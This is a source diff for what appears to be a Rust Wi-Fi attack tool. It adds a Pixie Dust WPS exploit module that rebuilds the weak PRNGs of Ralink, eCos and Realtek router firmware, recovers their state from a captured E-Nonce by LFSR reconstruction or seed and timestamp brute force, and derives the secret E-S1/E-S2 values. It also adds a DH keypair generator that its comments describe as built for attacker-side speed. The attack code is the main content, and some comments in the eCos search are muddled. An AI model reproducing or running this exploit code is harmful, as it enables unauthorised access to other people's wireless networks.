@@ -2227,6 +2227,330 @@ pub fn pad_to_aes_block(data: &[u8]) -> Vec<u8> {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
+//  Pixie Dust PRNG Recovery — recover E-S1/E-S2 from weak PRNGs
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/// Ralink/MediaTek Galois LFSR PRNG (mode 1 in pixiewps).
+/// Polynomial: x^32 + x^6 + x^4 + x^2 + x + 1 = 0x80000057.
+pub mod prng {
+    /// Advance Ralink LFSR one byte (8 bits).
+    pub fn ralink_randbyte(sreg: &mut u32) -> u8 {
+        let mut r: u8 = 0;
+        for _ in 0..8 {
+            let bit;
+            if *sreg & 1 != 0 {
+                *sreg = ((*sreg ^ 0x80000057) >> 1) | 0x80000000;
+                bit = 1u8;
+            } else {
+                *sreg >>= 1;
+                bit = 0;
+            }
+            r = (r << 1) | bit;
+        }
+        r
+    }
+
+    /// Reverse Ralink LFSR one bit (step backwards).
+    pub fn ralink_reverse_bit(sreg: &mut u32) {
+        if *sreg & 0x80000000 != 0 {
+            *sreg = ((*sreg & 0x7FFFFFFF) << 1) | 1;
+            *sreg ^= 0x80000057;
+        } else {
+            *sreg <<= 1;
+        }
+    }
+
+    /// Reverse Ralink LFSR one byte (8 bits backwards).
+    pub fn ralink_reverse_byte(sreg: &mut u32) {
+        for _ in 0..8 {
+            ralink_reverse_bit(sreg);
+        }
+    }
+
+    /// Reconstruct LFSR state from E-Nonce (16 bytes produced by forward generation).
+    /// Returns the state AFTER producing the last byte of E-Nonce.
+    pub fn ralink_state_from_nonce(nonce: &[u8; 16]) -> u32 {
+        // Reconstruct: the nonce was produced byte-by-byte from the LFSR.
+        // We can reconstruct the state from any 4 consecutive bytes because
+        // the LFSR has 32 bits of state. We use the last 4 bytes.
+        //
+        // Actually, the simplest approach: try to find a state that produces the nonce.
+        // For LFSR, we can reconstruct from the bit stream directly.
+        //
+        // Each output bit is the LSB of the state before the shift.
+        // Given 32 consecutive output bits, we can reconstruct the state.
+        // The first 4 bytes of the nonce give us 32 bits.
+        let mut state: u32 = 0;
+        for i in 0..4 {
+            for bit_idx in (0..8).rev() {
+                state <<= 1;
+                state |= ((nonce[i] >> bit_idx) & 1) as u32;
+            }
+        }
+        // Now advance the state through the remaining 12 bytes to get the state
+        // at the end of nonce generation.
+        let mut sreg = state;
+        for i in 4..16 {
+            let produced = ralink_randbyte(&mut sreg);
+            if produced != nonce[i] {
+                return 0; // State reconstruction failed
+            }
+        }
+        sreg
+    }
+
+    /// eCos simple LCG: three calls per random word.
+    /// seed = seed * 1103515245 + 12345
+    pub fn ecos_rand_simple(seed: &mut u32) -> u32 {
+        *seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
+        let mut uret = *seed & 0xFFE00000;
+        *seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
+        uret |= (*seed & 0xFFFC0000) >> 11;
+        *seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
+        uret |= (*seed & 0xFE000000) >> 22;
+        uret
+    }
+
+    /// eCos simplest LCG: single call per random word.
+    pub fn ecos_rand_simplest(seed: &mut u32) -> u32 {
+        *seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
+        *seed
+    }
+
+    /// eCos Knuth multiplicative congruential generator.
+    pub fn ecos_rand_knuth(seed: &mut u32) -> u32 {
+        const MM: u32 = 2147515647;
+        const AA: u32 = 48271;
+        const QQ: u32 = 44488;
+        const RR: u32 = 3399;
+        *seed = AA.wrapping_mul(*seed % QQ).wrapping_sub(RR.wrapping_mul(*seed / QQ));
+        if *seed & 0x80000000 != 0 {
+            *seed = seed.wrapping_add(MM);
+        }
+        *seed
+    }
+
+    /// Generate 16 nonce bytes using eCos simple LCG from a given seed.
+    pub fn ecos_simple_nonce(mut seed: u32) -> ([u8; 16], u32) {
+        let mut nonce = [0u8; 16];
+        for i in (0..16).step_by(4) {
+            let val = ecos_rand_simple(&mut seed);
+            nonce[i] = (val >> 24) as u8;
+            nonce[i + 1] = (val >> 16) as u8;
+            nonce[i + 2] = (val >> 8) as u8;
+            nonce[i + 3] = val as u8;
+        }
+        (nonce, seed)
+    }
+
+    /// Generate 16 bytes using eCos simplest LCG.
+    pub fn ecos_simplest_nonce(mut seed: u32) -> ([u8; 16], u32) {
+        let mut nonce = [0u8; 16];
+        for b in &mut nonce {
+            let val = ecos_rand_simplest(&mut seed);
+            *b = (val & 0xFF) as u8;
+        }
+        (nonce, seed)
+    }
+
+    /// Generate 16 bytes using eCos Knuth.
+    pub fn ecos_knuth_nonce(mut seed: u32) -> ([u8; 16], u32) {
+        let mut nonce = [0u8; 16];
+        for b in &mut nonce {
+            let val = ecos_rand_knuth(&mut seed);
+            *b = (val & 0xFF) as u8;
+        }
+        (nonce, seed)
+    }
+
+    /// Realtek RTL819x: glibc random() with TYPE_3 (degree 31) polynomial.
+    /// Seed initialization uses Lehmer RNG: s[i] = (16807 * s[i-1]) % 2^31-1
+    pub struct GlibcRandom {
+        state: [i32; 34],  // 31 words + 3 for indexing
+        fptr: usize,       // front pointer
+        rptr: usize,       // rear pointer
+    }
+
+    impl GlibcRandom {
+        pub fn new(seed: u32) -> Self {
+            let mut r = Self {
+                state: [0i32; 34],
+                fptr: 3 + 3,   // TYPE_3: separation = 3, initial fptr = sep + offset
+                rptr: 3,       // initial rptr = offset (index 3 into state)
+            };
+            // Initialize state table with Lehmer RNG
+            r.state[3] = seed as i32;
+            for i in 1..31u32 {
+                let prev = r.state[3 + i as usize - 1] as i64;
+                let next = (16807 * prev) % 0x7FFFFFFF;
+                r.state[3 + i as usize] = next as i32;
+            }
+            r.fptr = 3 + 3;
+            r.rptr = 3;
+            // Do 310 "warm-up" iterations as glibc does
+            for _ in 0..310 {
+                r.next();
+            }
+            r
+        }
+
+        pub fn next(&mut self) -> i32 {
+            let val = self.state[self.fptr].wrapping_add(self.state[self.rptr]);
+            self.state[self.fptr] = val;
+            let result = (val as u32 >> 1) as i32;  // discard LSB
+            self.fptr += 1;
+            if self.fptr >= 3 + 31 {
+                self.fptr = 3;
+                self.rptr += 1;
+            } else {
+                self.rptr += 1;
+                if self.rptr >= 3 + 31 {
+                    self.rptr = 3;
+                }
+            }
+            result
+        }
+
+        /// Generate 16 nonce bytes.
+        pub fn gen_nonce(&mut self) -> [u8; 16] {
+            let mut nonce = [0u8; 16];
+            for b in &mut nonce {
+                *b = (self.next() & 0xFF) as u8;
+            }
+            nonce
+        }
+    }
+}
+
+/// Attempt to recover E-S1 and E-S2 using Ralink LFSR PRNG.
+/// The LFSR state can be reconstructed from E-Nonce, then run forward to get E-S1/E-S2.
+pub fn pixie_recover_ralink(e_nonce: &[u8; 16]) -> Option<([u8; 16], [u8; 16])> {
+    let state = prng::ralink_state_from_nonce(e_nonce);
+    if state == 0 {
+        return None;
+    }
+    // State is now at the end of E-Nonce generation.
+    // E-S1 is the next 16 bytes, E-S2 is the 16 after that.
+    let mut sreg = state;
+    let mut e_s1 = [0u8; 16];
+    let mut e_s2 = [0u8; 16];
+    for b in &mut e_s1 {
+        *b = prng::ralink_randbyte(&mut sreg);
+    }
+    for b in &mut e_s2 {
+        *b = prng::ralink_randbyte(&mut sreg);
+    }
+    Some((e_s1, e_s2))
+}
+
+/// Attempt to recover E-S1/E-S2 using eCos simple LCG.
+/// First nonce byte constrains seed to ~33.5M candidates (25-bit search space).
+pub fn pixie_recover_ecos_simple(e_nonce: &[u8; 16]) -> Option<([u8; 16], [u8; 16])> {
+    let target_first = e_nonce[0];
+    // First call: seed *= 1103515245 + 12345, then upper 11 bits of result
+    // The first byte of the nonce comes from the high byte of the first ecos_rand_simple output.
+    // Brute force seeds where the first generated nonce byte matches.
+    for high_bits in 0..0x200_0000u32 {
+        // The first LCG output's top 11 bits form the top of the nonce word.
+        // Reconstruct: after 3 LCG calls, the top 11 bits are from call 1,
+        // next 11 from call 2, next 10 from call 3.
+        // The first byte = top 8 bits of the composite word.
+        let seed_candidate = high_bits;
+        let mut seed = seed_candidate;
+        let (nonce, post_nonce_seed) = prng::ecos_simple_nonce(seed);
+        if nonce[0] == target_first && nonce == *e_nonce {
+            // Found the seed! Generate E-S1 and E-S2
+            seed = post_nonce_seed;
+            let (e_s1, seed2) = prng::ecos_simple_nonce(seed);
+            let (e_s2, _) = prng::ecos_simple_nonce(seed2);
+            return Some((e_s1, e_s2));
+        }
+    }
+    None
+}
+
+/// Attempt to recover E-S1/E-S2 using Realtek RTL819x glibc random().
+/// Brute-force timestamp seeds in a window of +/- 1 day (~172800 candidates).
+pub fn pixie_recover_realtek_timestamp(e_nonce: &[u8; 16], approx_time: u32) -> Option<([u8; 16], [u8; 16])> {
+    let window = 86400u32; // +/- 1 day
+    let start = approx_time.saturating_sub(window);
+    let end = approx_time.saturating_add(window);
+
+    for ts in start..=end {
+        let mut rng = prng::GlibcRandom::new(ts);
+        let nonce = rng.gen_nonce();
+        if nonce == *e_nonce {
+            let mut e_s1 = [0u8; 16];
+            let mut e_s2 = [0u8; 16];
+            for b in &mut e_s1 {
+                *b = (rng.next() & 0xFF) as u8;
+            }
+            for b in &mut e_s2 {
+                *b = (rng.next() & 0xFF) as u8;
+            }
+            return Some((e_s1, e_s2));
+        }
+    }
+    None
+}
+
+/// Attempt to recover E-S1/E-S2 using eCos simplest LCG.
+/// Sequential seed search from 0 (limited to first 2^25 seeds for time budget).
+pub fn pixie_recover_ecos_simplest(e_nonce: &[u8; 16]) -> Option<([u8; 16], [u8; 16])> {
+    for seed_candidate in 0..0x2000000u32 {
+        let (nonce, post_seed) = prng::ecos_simplest_nonce(seed_candidate);
+        if nonce == *e_nonce {
+            let (e_s1, post_s1) = prng::ecos_simplest_nonce(post_seed);
+            let (e_s2, _) = prng::ecos_simplest_nonce(post_s1);
+            return Some((e_s1, e_s2));
+        }
+    }
+    None
+}
+
+/// Attempt to recover E-S1/E-S2 using eCos Knuth multiplicative generator.
+/// Sequential seed search (limited to first 2^25 seeds).
+pub fn pixie_recover_ecos_knuth(e_nonce: &[u8; 16]) -> Option<([u8; 16], [u8; 16])> {
+    for seed_candidate in 1..0x2000000u32 {
+        let (nonce, post_seed) = prng::ecos_knuth_nonce(seed_candidate);
+        if nonce == *e_nonce {
+            let (e_s1, post_s1) = prng::ecos_knuth_nonce(post_seed);
+            let (e_s2, _) = prng::ecos_knuth_nonce(post_s1);
+            return Some((e_s1, e_s2));
+        }
+    }
+    None
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  Fast DH Key Generation (small private key for attacker-side speed)
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/// Generate a DH keypair with a small private key (32 random bytes instead of 192).
+///
+/// Since we're the attacker, our private key's security doesn't matter —
+/// we only need a valid DH exchange. This reduces modpow time from ~1-2s to ~50-200ms.
+pub fn wps_dh_generate_fast() -> Option<(Vec<u8>, Vec<u8>)> {
+    let mut privkey = vec![0u8; 192];
+    // Only randomize the last 32 bytes — the rest stays zero
+    getrandom::getrandom(&mut privkey[160..]).ok()?;
+    // Clear top bit of the random portion to ensure privkey < prime
+    privkey[160] &= 0x7F;
+
+    let prime = BigUint::from_bytes_be(&DH_GROUP5_PRIME);
+    let priv_bn = BigUint::from_bytes_be(&privkey);
+    let generator = BigUint::from(DH_GROUP5_GENERATOR as u64);
+    let pub_bn = generator.modpow(&priv_bn, &prime);
+    let pub_bytes = pub_bn.to_bytes_be();
+
+    let mut pubkey = vec![0u8; 192];
+    let offset = 192 - pub_bytes.len();
+    pubkey[offset..].copy_from_slice(&pub_bytes);
+
+    Some((privkey, pubkey))
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
 //  Tests
 // ═══════════════════════════════════════════════════════════════════════════════
 
